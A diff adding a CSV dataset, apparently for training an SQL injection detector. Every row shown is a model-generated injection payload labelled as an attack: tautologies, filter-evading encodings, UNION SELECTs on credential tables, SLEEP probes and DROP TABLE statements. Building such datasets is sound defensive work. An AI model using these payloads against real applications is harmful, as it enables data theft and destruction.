@@ -1,0 +1,1799 @@
+text,label,attack_type,generator
+"""); DROP TABLE customers/*x*/",1,sqli,codellama
+'; SELECT SLEEP(5)%23,1,sqli,codellama
+"""+AND+0<1+-- ",1,sqli,codellama
+""") OR 1=1 LIMIT 1-- ",1,sqli,codellama
+""") OR ''='' -- -",1,sqli,codellama
+')/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,codellama
+"""%09AND%09''=''%09#",1,sqli,codellama
+`/**/AND/**/1=2/**/%23,1,sqli,codellama
+""")+AND+'a'='a'+#",1,sqli,codellama
+""")	OR	'a'='a'	-- ",1,sqli,codellama
+']%09AND%09'a'='a'%09/*x*/,1,sqli,codellama
+"` UNION SELECT NULL,NULL,NULL/*x*/",1,sqli,codellama
+'%0d%0aAND%0d%0a''=''%0d%0a--,1,sqli,codellama
+"""%0aAND%0a2>1%0a%23",1,sqli,codellama
+`; DROP TABLE admin/*x*/,1,sqli,codellama
+"""); SELECT SLEEP(5)-- -",1,sqli,codellama
+"' UNION SELECT email,role FROM customers#",1,sqli,codellama
+`/**/AND/**/2>1/**//*x*/,1,sqli,codellama
+'; DROP TABLE staff/*x*/,1,sqli,codellama
+"""	AND	1 BETWEEN 0 AND 9	-- -",1,sqli,codellama
+']%09AND%09'a'='a'%09--,1,sqli,codellama
+') OR 1=1 LIMIT 1%23,1,sqli,codellama
+']%0d%0aAND%0d%0a''=''%0d%0a--,1,sqli,codellama
+' AND 0<1 --,1,sqli,codellama
+"') AND extractvalue(1,concat(0x7e,(SELECT status FROM admin LIMIT 1)))",1,sqli,codellama
+"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a--",1,sqli,codellama
+""" UNION SELECT last_name,username,role,status FROM sessions/*x*/",1,sqli,codellama
+` AND ''='' #,1,sqli,codellama
+`+OR+1 BETWEEN 0 AND 9+%23,1,sqli,codellama
+`+OR+1=2+-- -,1,sqli,codellama
+""")	AND	2>1	-- -",1,sqli,codellama
+`; DROP TABLE credentials#,1,sqli,codellama
+"'] UNION SELECT user,last_name FROM users#",1,sqli,codellama
+`%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/,1,sqli,codellama
+' AND 2>1 -- -,1,sqli,codellama
+""")%09OR%09'a'='a'%09--",1,sqli,codellama
+`; DROP TABLE tokens/*x*/,1,sqli,codellama
+'] OR 1=1 LIMIT 1#,1,sqli,codellama
+'; DROP TABLE admin--,1,sqli,codellama
+"` UNION SELECT username,pwd,status,account,last_name,id FROM admin--",1,sqli,codellama
+""" AND ''='' #",1,sqli,codellama
+"""); SELECT SLEEP(5)%23",1,sqli,codellama
+"` UNION SELECT username,pwd,account,status FROM accounts#",1,sqli,codellama
+""")%0aOR%0a2>1%0a#",1,sqli,codellama
+'/**/OR/**/'a'='a'/**/-- ,1,sqli,codellama
+'	OR	''=''	--,1,sqli,codellama
+'%0aOR%0a1 LIKE 1%0a-- -,1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM credentials)>0%23,1,sqli,codellama
+"""%0aAND%0a'a'='a'%0a#",1,sqli,codellama
+"""	AND	'a'='a'	-- ",1,sqli,codellama
+']%0aOR%0a1=2%0a-- -,1,sqli,codellama
+""")%0aOR%0a'a'='a'%0a-- ",1,sqli,codellama
+']%0d%0aOR%0d%0a1=1%0d%0a-- ,1,sqli,codellama
+""") AND 1=2 #",1,sqli,codellama
+"' AND extractvalue(1,concat(0x7e,(SELECT account FROM admin LIMIT 1)))",1,sqli,codellama
+`%09OR%091 LIKE 1%09--,1,sqli,codellama
+`; SELECT SLEEP(5)--,1,sqli,codellama
+"""%0d%0aAND%0d%0a1 LIKE 1%0d%0a%23",1,sqli,codellama
+'/**/OR/**/1 LIKE 1/**/-- ,1,sqli,codellama
+'/**/OR/**/''=''/**/--,1,sqli,codellama
+']/**/AND/**/2>1/**//*x*/,1,sqli,codellama
+"""	OR	2>1	-- ",1,sqli,codellama
+"""%09OR%092>1%09--",1,sqli,codellama
+""") UNION SELECT uid,role FROM sessions-- -",1,sqli,codellama
+'/**/AND/**/1=2/**/--,1,sqli,codellama
+""") OR 1=1 LIMIT 1/*x*/",1,sqli,codellama
+"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23",1,sqli,codellama
+') OR 1=1 LIMIT 1--,1,sqli,codellama
+`%0aAND%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,codellama
+""")/**/AND/**/1 LIKE 1/**/--",1,sqli,codellama
+""") OR ''='' -- ",1,sqli,codellama
+')%0aOR%0a1 LIKE 1%0a#,1,sqli,codellama
+')	AND	1 LIKE 1	#,1,sqli,codellama
+""" AND 2>1 %23",1,sqli,codellama
+""") UNION SELECT email FROM accounts%23",1,sqli,codellama
+""")/**/OR/**/1 LIKE 1/**/--",1,sqli,codellama
+`+OR+0<1+-- ,1,sqli,codellama
+"""/**/AND/**/1=1/**/--",1,sqli,codellama
+')%0d%0aOR%0d%0a1 BETWEEN 0 AND 9%0d%0a-- ,1,sqli,codellama
+""") AND 1 LIKE 1 -- ",1,sqli,codellama
+']+OR+0<1+/*x*/,1,sqli,codellama
+' OR 1=2 /*x*/,1,sqli,codellama
+""")%09OR%091 BETWEEN 0 AND 9%09--",1,sqli,codellama
+')%0aAND%0a1 BETWEEN 0 AND 9%0a--,1,sqli,codellama
+`	OR	1=2	--,1,sqli,codellama
+'%09AND%092>1%09%23,1,sqli,codellama
+']/**/OR/**/1 LIKE 1/**/-- ,1,sqli,codellama
+') AND (SELECT COUNT(*) FROM credentials)>0--,1,sqli,codellama
+']	OR	''=''	/*x*/,1,sqli,codellama
+' AND 1=1 --,1,sqli,codellama
+')+OR+2>1+#,1,sqli,codellama
+'%0d%0aOR%0d%0a''=''%0d%0a#,1,sqli,codellama
+""")%0aAND%0a''=''%0a%23",1,sqli,codellama
+`/**/OR/**/''=''/**/-- ,1,sqli,codellama
+` OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
+'%0d%0aAND%0d%0a1=1%0d%0a-- ,1,sqli,codellama
+""" OR 1=1 LIMIT 1--",1,sqli,codellama
+' AND 1 BETWEEN 0 AND 9 #,1,sqli,codellama
+"""%0d%0aOR%0d%0a''=''%0d%0a--",1,sqli,codellama
+`%09AND%091 LIKE 1%09/*x*/,1,sqli,codellama
+""" AND 1 BETWEEN 0 AND 9 /*x*/",1,sqli,codellama
+'] AND 1=2 --,1,sqli,codellama
+""") UNION SELECT NULL,NULL,NULL,NULL-- -",1,sqli,codellama
+""" OR 'a'='a' -- -",1,sqli,codellama
+`%0d%0aOR%0d%0a0<1%0d%0a/*x*/,1,sqli,codellama
+']; SELECT SLEEP(5)-- ,1,sqli,codellama
+')	OR	1=1	#,1,sqli,codellama
+' OR 1=1 LIMIT 1%23,1,sqli,codellama
+""")/**/OR/**/2>1/**/-- ",1,sqli,codellama
+""" AND 0<1 #",1,sqli,codellama
+""" OR 1=1 LIMIT 1-- ",1,sqli,codellama
+""") OR 1=1 LIMIT 1-- -",1,sqli,codellama
+') OR 1=1 -- -,1,sqli,codellama
+'; SELECT SLEEP(5)/*x*/,1,sqli,codellama
+']%0d%0aOR%0d%0a1=2%0d%0a-- -,1,sqli,codellama
+')%0d%0aAND%0d%0a1=2%0d%0a-- ,1,sqli,codellama
+""")+OR+1 LIKE 1+%23",1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM sessions)>0#",1,sqli,codellama
+' AND 1=2 %23,1,sqli,codellama
+')	OR	'a'='a'	-- -,1,sqli,codellama
+')+OR+0<1+-- -,1,sqli,codellama
+`%0d%0aAND%0d%0a1=2%0d%0a#,1,sqli,codellama
+')%0aOR%0a1=1%0a#,1,sqli,codellama
+""") UNION SELECT account,uid,id FROM admin-- ",1,sqli,codellama
+' OR 'a'='a' --,1,sqli,codellama
+')	OR	1 LIKE 1	-- -,1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM staff)>0/*x*/",1,sqli,codellama
+`%09OR%092>1%09%23,1,sqli,codellama
+']+AND+1 LIKE 1+#,1,sqli,codellama
+""" UNION SELECT NULL,NULL,NULL,NULL,NULL/*x*/",1,sqli,codellama
+""") AND 1=1 #",1,sqli,codellama
+'%09AND%09''=''%09/*x*/,1,sqli,codellama
+']%09OR%09'a'='a'%09--,1,sqli,codellama
+"""+OR+1 BETWEEN 0 AND 9+/*x*/",1,sqli,codellama
+"""%0aOR%0a'a'='a'%0a%23",1,sqli,codellama
+') AND 1=1 -- -,1,sqli,codellama
+'] AND 2>1 /*x*/,1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM customers)>0%23",1,sqli,codellama
+'/**/AND/**/1 LIKE 1/**/#,1,sqli,codellama
+""") OR ''='' %23",1,sqli,codellama
+"""; DROP TABLE admin-- ",1,sqli,codellama
+')%09AND%092>1%09#,1,sqli,codellama
+"'] AND extractvalue(1,concat(0x7e,(SELECT status FROM credentials LIMIT 1)))",1,sqli,codellama
+"'] UNION SELECT id,status,last_name,user,name FROM users--",1,sqli,codellama
+')%09OR%091=2%09#,1,sqli,codellama
+`%09OR%091=2%09--,1,sqli,codellama
+"""/**/AND/**/'a'='a'/**/-- ",1,sqli,codellama
+""")+AND+''=''+-- ",1,sqli,codellama
+"""/**/OR/**/1=2/**/-- ",1,sqli,codellama
+"""%0aAND%0a1 LIKE 1%0a%23",1,sqli,codellama
+'%0aOR%0a'a'='a'%0a#,1,sqli,codellama
+')%09OR%09'a'='a'%09%23,1,sqli,codellama
+""") OR 1=1 LIMIT 1%23",1,sqli,codellama
+"""); DROP TABLE tokens%23",1,sqli,codellama
+'; SELECT SLEEP(5)--,1,sqli,codellama
+`	AND	1=2	-- ,1,sqli,codellama
+""")	OR	'a'='a'	/*x*/",1,sqli,codellama
+"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a-- -",1,sqli,codellama
+`	OR	2>1	#,1,sqli,codellama
+` AND (SELECT COUNT(*) FROM users)>0-- -,1,sqli,codellama
+']+OR+0<1+-- -,1,sqli,codellama
+'] AND 0<1 /*x*/,1,sqli,codellama
+' AND (SELECT COUNT(*) FROM tokens)>0-- -,1,sqli,codellama
+'] OR (SELECT username FROM orders WHERE username=907)=818,1,sqli,codellama
+`+OR+1=1+--,1,sqli,codellama
+"'] UNION SELECT token,uid,id FROM members-- ",1,sqli,codellama
+""")/**/AND/**/1 BETWEEN 0 AND 9/**/-- -",1,sqli,codellama
+'] AND 1 BETWEEN 0 AND 9 /*x*/,1,sqli,codellama
+` AND (SELECT COUNT(*) FROM admin)>0#,1,sqli,codellama
+""") AND extractvalue(1,concat(0x7e,(SELECT username FROM tokens LIMIT 1)))",1,sqli,codellama
+')+OR+0<1+#,1,sqli,codellama
+`; DROP TABLE admin--,1,sqli,codellama
+""")	OR	''=''	%23",1,sqli,codellama
+' OR 1=1 LIMIT 1#,1,sqli,codellama
+""")%0d%0aAND%0d%0a2>1%0d%0a--",1,sqli,codellama
+""")+OR+2>1+-- ",1,sqli,codellama
+')%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,codellama
+""")%09OR%09'a'='a'%09#",1,sqli,codellama
+']+OR+1 BETWEEN 0 AND 9+--,1,sqli,codellama
+"') UNION SELECT status,email,username FROM accounts-- ",1,sqli,codellama
+')	OR	''=''	--,1,sqli,codellama
+')/**/OR/**/0<1/**/--,1,sqli,codellama
+"""); DROP TABLE members%23",1,sqli,codellama
+'; DROP TABLE tokens%23,1,sqli,codellama
+""")+AND+'a'='a'+/*x*/",1,sqli,codellama
+`/**/OR/**/1=2/**/--,1,sqli,codellama
+"""; DROP TABLE members%23",1,sqli,codellama
+']+AND+'a'='a'+#,1,sqli,codellama
+""") OR 'a'='a' --",1,sqli,codellama
+""")%0d%0aOR%0d%0a1 LIKE 1%0d%0a-- ",1,sqli,codellama
+')%0aOR%0a1=2%0a-- -,1,sqli,codellama
+') UNION SELECT user FROM members%23,1,sqli,codellama
+"'] UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -",1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM members)>0--",1,sqli,codellama
+')+OR+1=1+#,1,sqli,codellama
+')%0d%0aOR%0d%0a''=''%0d%0a-- ,1,sqli,codellama
+`; DROP TABLE users#,1,sqli,codellama
+"') UNION SELECT first_name,account,id,password FROM admin%23",1,sqli,codellama
+')%09OR%090<1%09%23,1,sqli,codellama
+""" OR 1=1 LIMIT 1-- -",1,sqli,codellama
+""")/**/AND/**/1=1/**/%23",1,sqli,codellama
+'); SELECT SLEEP(5)/*x*/,1,sqli,codellama
+')	OR	2>1	/*x*/,1,sqli,codellama
+` AND (SELECT COUNT(*) FROM accounts)>0/*x*/,1,sqli,codellama
+""")%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/",1,sqli,codellama
+"""); SELECT SLEEP(5)/*x*/",1,sqli,codellama
+')%0aOR%0a2>1%0a--,1,sqli,codellama
+""") OR 2>1 -- -",1,sqli,codellama
+')%0aOR%0a'a'='a'%0a-- ,1,sqli,codellama
+'] OR 1=1 LIMIT 1-- -,1,sqli,codellama
+""") UNION SELECT id,role,pwd FROM accounts-- -",1,sqli,codellama
+') OR 1 LIKE 1 /*x*/,1,sqli,codellama
+' OR ''='' #,1,sqli,codellama
+'] OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
+""")	OR	1 BETWEEN 0 AND 9	--",1,sqli,codellama
+') UNION SELECT user FROM members/*x*/,1,sqli,codellama
+'] OR 'a'='a' %23,1,sqli,codellama
+`%09AND%092>1%09-- ,1,sqli,codellama
+`; SELECT SLEEP(5)-- -,1,sqli,codellama
+""" OR 1 BETWEEN 0 AND 9 #",1,sqli,codellama
+']/**/OR/**/2>1/**/-- ,1,sqli,codellama
+"'] UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ",1,sqli,codellama
+`/**/AND/**/0<1/**//*x*/,1,sqli,codellama
+']; DROP TABLE accounts/*x*/,1,sqli,codellama
+""")+OR+''=''+/*x*/",1,sqli,codellama
+""" UNION SELECT first_name FROM sessions/*x*/",1,sqli,codellama
+"""+OR+1 LIKE 1+-- ",1,sqli,codellama
+'%0aAND%0a'a'='a'%0a-- ,1,sqli,codellama
+']/**/AND/**/1 BETWEEN 0 AND 9/**/%23,1,sqli,codellama
+']%09OR%09''=''%09-- ,1,sqli,codellama
+')%0aAND%0a''=''%0a-- ,1,sqli,codellama
+""" OR 2>1 -- ",1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM admin)>0--,1,sqli,codellama
+""")	OR	1 LIKE 1	#",1,sqli,codellama
+'] AND 1=2 -- -,1,sqli,codellama
+"""%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a/*x*/",1,sqli,codellama
+""")%09AND%092>1%09-- ",1,sqli,codellama
+""")	OR	'a'='a'	-- -",1,sqli,codellama
+']	AND	1 LIKE 1	/*x*/,1,sqli,codellama
+'/**/OR/**/1 LIKE 1/**/#,1,sqli,codellama
+`	AND	1=1	-- -,1,sqli,codellama
+'+OR+''=''+%23,1,sqli,codellama
+'	OR	'a'='a'	%23,1,sqli,codellama
+` OR 1=1 LIMIT 1%23,1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM members)>0#,1,sqli,codellama
+""") AND 1=2 /*x*/",1,sqli,codellama
+')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a#,1,sqli,codellama
+"""+AND+''=''+#",1,sqli,codellama
+"""/**/OR/**/1=1/**/-- ",1,sqli,codellama
+""")%0d%0aOR%0d%0a1=2%0d%0a-- -",1,sqli,codellama
+"""%0d%0aOR%0d%0a''=''%0d%0a-- ",1,sqli,codellama
+`%09OR%092>1%09-- -,1,sqli,codellama
+"') UNION SELECT last_name,first_name,id,uid,password FROM credentials/*x*/",1,sqli,codellama
+')%0aAND%0a2>1%0a/*x*/,1,sqli,codellama
+""") AND (SELECT COUNT(*) FROM members)>0%23",1,sqli,codellama
+""")%09OR%091 LIKE 1%09--",1,sqli,codellama
+`+OR+1 LIKE 1+#,1,sqli,codellama
+'%09AND%09''=''%09-- -,1,sqli,codellama
+']	OR	2>1	--,1,sqli,codellama
+']/**/AND/**/1 BETWEEN 0 AND 9/**//*x*/,1,sqli,codellama
+']	OR	1=2	/*x*/,1,sqli,codellama
+'+AND+1=1+/*x*/,1,sqli,codellama
+'%09AND%091 BETWEEN 0 AND 9%09-- ,1,sqli,codellama
+""" OR 1=1 LIMIT 1%23",1,sqli,codellama
+']; SELECT SLEEP(5)#,1,sqli,codellama
+"""/**/AND/**/0<1/**/-- -",1,sqli,codellama
+')+AND+1 LIKE 1+%23,1,sqli,codellama
+' OR 1=1 /*x*/,1,sqli,codellama
+'/**/OR/**/1 BETWEEN 0 AND 9/**/#,1,sqli,codellama
+` OR 1=1 LIMIT 1#,1,sqli,codellama
+""" OR 1=1 LIMIT 1/*x*/",1,sqli,codellama
+` AND 0<1 /*x*/,1,sqli,codellama
+`%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a%23,1,sqli,codellama
+"' UNION SELECT first_name,email,status,password,id,role FROM members/*x*/",1,sqli,codellama
+"""); DROP TABLE admin/*x*/",1,sqli,codellama
+""")	AND	''=''	/*x*/",1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM credentials)>0/*x*/",1,sqli,codellama
+"""; DROP TABLE admin-- -",1,sqli,codellama
+'%0aAND%0a2>1%0a-- -,1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM accounts)>0#,1,sqli,codellama
+']+AND+''=''+-- ,1,sqli,codellama
+""") OR 2>1 --",1,sqli,codellama
+"""%0d%0aOR%0d%0a0<1%0d%0a#",1,sqli,codellama
+""")	AND	''=''	-- ",1,sqli,codellama
+""")%0d%0aOR%0d%0a1 LIKE 1%0d%0a%23",1,sqli,codellama
+')	OR	1=2	#,1,sqli,codellama
+"""	AND	2>1	--",1,sqli,codellama
+""") OR 1 LIKE 1 -- -",1,sqli,codellama
+')%0d%0aOR%0d%0a1=2%0d%0a#,1,sqli,codellama
+')	OR	'a'='a'	/*x*/,1,sqli,codellama
+""")+AND+1=2+%23",1,sqli,codellama
+' AND 2>1 %23,1,sqli,codellama
+'; SELECT SLEEP(5)#,1,sqli,codellama
+' OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
+"""/**/OR/**/1=1/**//*x*/",1,sqli,codellama
+"""	OR	''=''	--",1,sqli,codellama
+""") UNION SELECT NULL--",1,sqli,codellama
+"') UNION SELECT role,token,user,last_name,name,username FROM sessions#",1,sqli,codellama
+` AND 1=2 /*x*/,1,sqli,codellama
+""")%09AND%09'a'='a'%09--",1,sqli,codellama
+"""/**/OR/**/1 BETWEEN 0 AND 9/**/--",1,sqli,codellama
+']+AND+2>1+--,1,sqli,codellama
+`/**/AND/**/''=''/**/-- -,1,sqli,codellama
+"""/**/OR/**/1=2/**/%23",1,sqli,codellama
+`/**/AND/**/1 BETWEEN 0 AND 9/**/-- ,1,sqli,codellama
+"""	OR	1=2	-- -",1,sqli,codellama
+']+OR+1=1+-- ,1,sqli,codellama
+` AND (SELECT COUNT(*) FROM accounts)>0%23,1,sqli,codellama
+']%0aAND%0a'a'='a'%0a--,1,sqli,codellama
+`+OR+1=2+--,1,sqli,codellama
+'%09AND%091 BETWEEN 0 AND 9%09-- -,1,sqli,codellama
+' OR 1=1 LIMIT 1-- -,1,sqli,codellama
+']%0d%0aOR%0d%0a2>1%0d%0a-- -,1,sqli,codellama
+""")%0aOR%0a2>1%0a--",1,sqli,codellama
+']%0d%0aOR%0d%0a1=2%0d%0a/*x*/,1,sqli,codellama
+""") AND (SELECT COUNT(*) FROM tokens)>0#",1,sqli,codellama
+"' UNION SELECT NULL,NULL,NULL%23",1,sqli,codellama
+""")	AND	0<1	/*x*/",1,sqli,codellama
+') AND 0<1 /*x*/,1,sqli,codellama
+'); DROP TABLE admin#,1,sqli,codellama
+"""/**/AND/**/''=''/**//*x*/",1,sqli,codellama
+"' UNION SELECT NULL,NULL-- -",1,sqli,codellama
+""")%0aOR%0a0<1%0a-- -",1,sqli,codellama
+""") OR 1=1 LIMIT 1#",1,sqli,codellama
+`%09OR%09'a'='a'%09#,1,sqli,codellama
+') AND (SELECT COUNT(*) FROM customers)>0-- ,1,sqli,codellama
+""") UNION SELECT name,pwd,role,last_name,status FROM users-- -",1,sqli,codellama
+"'] UNION SELECT NULL,NULL,NULL,NULL-- -",1,sqli,codellama
+')%0d%0aAND%0d%0a0<1%0d%0a-- -,1,sqli,codellama
+'	OR	''=''	/*x*/,1,sqli,codellama
+"""+AND+'a'='a'+-- -",1,sqli,codellama
+' AND (SELECT COUNT(*) FROM accounts)>0/*x*/,1,sqli,codellama
+'/**/OR/**/0<1/**/-- ,1,sqli,codellama
+']%09OR%091=1%09-- -,1,sqli,codellama
+"""+AND+1=1+%23",1,sqli,codellama
+']	OR	1 BETWEEN 0 AND 9	/*x*/,1,sqli,codellama
+"` AND extractvalue(1,concat(0x7e,(SELECT role FROM users LIMIT 1)))",1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM sessions)>0--",1,sqli,codellama
+`; SELECT SLEEP(5)%23,1,sqli,codellama
+'%09OR%091=1%09-- -,1,sqli,codellama
+""") AND 0<1 #",1,sqli,codellama
+`/**/OR/**/1=1/**/--,1,sqli,codellama
+"""/**/AND/**/1 BETWEEN 0 AND 9/**/--",1,sqli,codellama
+` AND 1 BETWEEN 0 AND 9 #,1,sqli,codellama
+` AND (SELECT COUNT(*) FROM admin)>0-- -,1,sqli,codellama
+'	OR	1=2	%23,1,sqli,codellama
+""")%09AND%091 BETWEEN 0 AND 9%09--",1,sqli,codellama
+"""%09OR%09'a'='a'%09--",1,sqli,codellama
+"""); SELECT SLEEP(5)#",1,sqli,codellama
+']+AND+''=''+#,1,sqli,codellama
+""") OR (SELECT pwd FROM accounts WHERE pwd=681)=555",1,sqli,codellama
+`%0aAND%0a0<1%0a-- ,1,sqli,codellama
+"""; SELECT SLEEP(5)/*x*/",1,sqli,codellama
+"""%0d%0aOR%0d%0a0<1%0d%0a/*x*/",1,sqli,codellama
+""")%0aOR%0a1=2%0a-- ",1,sqli,codellama
+']/**/AND/**/1 BETWEEN 0 AND 9/**/--,1,sqli,codellama
+'	AND	''=''	%23,1,sqli,codellama
+'); DROP TABLE staff-- ,1,sqli,codellama
+` AND 0<1 #,1,sqli,codellama
+']; DROP TABLE admin%23,1,sqli,codellama
+""")%0d%0aAND%0d%0a1=1%0d%0a/*x*/",1,sqli,codellama
+')/**/OR/**/''=''/**/-- -,1,sqli,codellama
+']%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
+"' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--",1,sqli,codellama
+` AND 1 LIKE 1 %23,1,sqli,codellama
+'%09OR%09''=''%09-- -,1,sqli,codellama
+' OR 1=1 LIMIT 1-- ,1,sqli,codellama
+""")/**/AND/**/0<1/**/-- ",1,sqli,codellama
+')	OR	1 BETWEEN 0 AND 9	%23,1,sqli,codellama
+"""	OR	1 BETWEEN 0 AND 9	/*x*/",1,sqli,codellama
+')%0d%0aAND%0d%0a1 BETWEEN 0 AND 9%0d%0a--,1,sqli,codellama
+""")%0aAND%0a1=2%0a--",1,sqli,codellama
+"` UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL#",1,sqli,codellama
+']	OR	1=1	#,1,sqli,codellama
+']+AND+1 LIKE 1+/*x*/,1,sqli,codellama
+""") AND (SELECT COUNT(*) FROM staff)>0%23",1,sqli,codellama
+']	AND	0<1	/*x*/,1,sqli,codellama
+' AND (SELECT COUNT(*) FROM members)>0-- -,1,sqli,codellama
+`; SELECT SLEEP(5)#,1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM admin)>0/*x*/,1,sqli,codellama
+' AND (SELECT COUNT(*) FROM admin)>0#,1,sqli,codellama
+'; DROP TABLE sessions%23,1,sqli,codellama
+"""); DROP TABLE sessions%23",1,sqli,codellama
+""") AND 1=1 /*x*/",1,sqli,codellama
+'	AND	1 LIKE 1	%23,1,sqli,codellama
+"""; SELECT SLEEP(5)-- ",1,sqli,codellama
+'] AND (SELECT COUNT(*) FROM orders)>0#,1,sqli,codellama
+']%0aOR%0a2>1%0a-- -,1,sqli,codellama
+"""); SELECT SLEEP(5)-- ",1,sqli,codellama
+""")	AND	0<1	-- -",1,sqli,codellama
+']%0d%0aOR%0d%0a1=2%0d%0a-- ,1,sqli,codellama
+'%0aAND%0a1=2%0a-- ,1,sqli,codellama
+') OR (SELECT token FROM admin WHERE token=860)=934,1,sqli,codellama
+""")%09AND%091 BETWEEN 0 AND 9%09#",1,sqli,codellama
+']/**/AND/**/''=''/**/-- ,1,sqli,codellama
+'	AND	'a'='a'	#,1,sqli,codellama
+'); SELECT SLEEP(5)%23,1,sqli,codellama
+`; DROP TABLE users-- ,1,sqli,codellama
+"') UNION SELECT NULL,NULL,NULL-- -",1,sqli,codellama
+']; SELECT SLEEP(5)--,1,sqli,codellama
+` OR 1=1 LIMIT 1-- -,1,sqli,codellama
+` OR 1=1 %23,1,sqli,codellama
+')%09OR%092>1%09-- -,1,sqli,codellama
+']%09OR%091=1%09#,1,sqli,codellama
+"') UNION SELECT NULL,NULL,NULL/*x*/",1,sqli,codellama
+')%0aOR%0a1=2%0a#,1,sqli,codellama
+`/**/AND/**/1=1/**/--,1,sqli,codellama
+'] AND ''='' --,1,sqli,codellama
+"""; DROP TABLE orders#",1,sqli,codellama
+""")%09OR%091=2%09--",1,sqli,codellama
+""") AND (SELECT COUNT(*) FROM customers)>0-- -",1,sqli,codellama
+""")%0aAND%0a0<1%0a/*x*/",1,sqli,codellama
+'%0aOR%0a1 BETWEEN 0 AND 9%0a-- ,1,sqli,codellama
+'%0d%0aAND%0d%0a1 LIKE 1%0d%0a-- -,1,sqli,codellama
+`+OR+1=2+-- ,1,sqli,codellama
+')%0aOR%0a2>1%0a%23,1,sqli,codellama
+']/**/AND/**/0<1/**/--,1,sqli,codellama
+""")%0d%0aOR%0d%0a1=1%0d%0a%23",1,sqli,codellama
+')+AND+'a'='a'+#,1,sqli,codellama
+"` UNION SELECT uid,status,token FROM users-- ",1,sqli,codellama
+"""%0d%0aAND%0d%0a1 LIKE 1%0d%0a-- ",1,sqli,codellama
+""" OR (SELECT name FROM sessions WHERE name=530)=320",1,sqli,codellama
+'; SELECT SLEEP(5)-- -,1,sqli,codellama
+') OR 0<1 %23,1,sqli,codellama
+"""%09OR%090<1%09#",1,sqli,codellama
+""" OR 1=1 LIMIT 1#",1,sqli,codellama
+""")%09OR%090<1%09#",1,sqli,codellama
+']; DROP TABLE admin--,1,sqli,codellama
+`+OR+''=''+#,1,sqli,codellama
+')%09AND%091=1%09-- -,1,sqli,codellama
+'%0aAND%0a'a'='a'%0a/*x*/,1,sqli,codellama
+']; SELECT SLEEP(5)%23,1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM accounts)>0#",1,sqli,codellama
+'%0d%0aOR%0d%0a0<1%0d%0a%23,1,sqli,codellama
+"""/**/AND/**/1=1/**/#",1,sqli,codellama
+'%09OR%09''=''%09--,1,sqli,codellama
+"""); DROP TABLE customers#",1,sqli,codellama
+"""+AND+1 LIKE 1+--",1,sqli,codellama
+'); SELECT SLEEP(5)-- ,1,sqli,codellama
+""")%09OR%090<1%09-- -",1,sqli,codellama
+"""%09OR%091 LIKE 1%09-- ",1,sqli,codellama
+"') UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,sqli,codellama
+`; DROP TABLE users-- -,1,sqli,codellama
+']%0d%0aAND%0d%0a''=''%0d%0a/*x*/,1,sqli,codellama
+""") AND (SELECT COUNT(*) FROM accounts)>0-- -",1,sqli,codellama
+""" OR 1=1 %23",1,sqli,codellama
+"""	OR	''=''	%23",1,sqli,codellama
+'] OR 0<1 %23,1,sqli,codellama
+') AND (SELECT COUNT(*) FROM accounts)>0-- ,1,sqli,codellama
+']%0aAND%0a1=2%0a/*x*/,1,sqli,codellama
+'%09OR%09'a'='a'%09%23,1,sqli,codellama
+""")%09AND%090<1%09/*x*/",1,sqli,codellama
+"""; SELECT SLEEP(5)#",1,sqli,codellama
+`%0aOR%0a1 BETWEEN 0 AND 9%0a/*x*/,1,sqli,codellama
+')%09AND%091=2%09-- -,1,sqli,codellama
+')+OR+0<1+%23,1,sqli,codellama
+') OR 1=1 LIMIT 1/*x*/,1,sqli,codellama
+""" AND (SELECT COUNT(*) FROM credentials)>0%23",1,sqli,codellama
+"""/**/OR/**/'a'='a'/**/-- -",1,sqli,codellama
+"""; DROP TABLE users-- -",1,sqli,codellama
+` AND (SELECT COUNT(*) FROM tokens)>0--,1,sqli,codellama
+`/**/OR/**/0<1/**/-- -,1,sqli,codellama
+""")%0aAND%0a1=1%0a-- ",1,sqli,codellama
+"') UNION SELECT email,uid,last_name,id,name FROM sessions%23",1,sqli,codellama
+""")%0aOR%0a0<1%0a%23",1,sqli,codellama
+']%0d%0aAND%0d%0a2>1%0d%0a/*x*/,1,sqli,codellama
+`%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
+'] AND 1 LIKE 1 /*x*/,1,sqli,codellama
+`%0d%0aAND%0d%0a0<1%0d%0a/*x*/,1,sqli,codellama
+'/**/AND/**/1 BETWEEN 0 AND 9/**/#,1,sqli,codellama
+`%0d%0aOR%0d%0a1 LIKE 1%0d%0a/*x*/,1,sqli,codellama
+' AND 1=1 -- -,1,sqli,codellama
+']%0d%0aOR%0d%0a0<1%0d%0a-- -,1,sqli,codellama
+']%0aOR%0a2>1%0a-- ,1,sqli,codellama
+')%0d%0aOR%0d%0a0<1%0d%0a--,1,sqli,codellama
+""")%0d%0aAND%0d%0a'a'='a'%0d%0a#",1,sqli,codellama
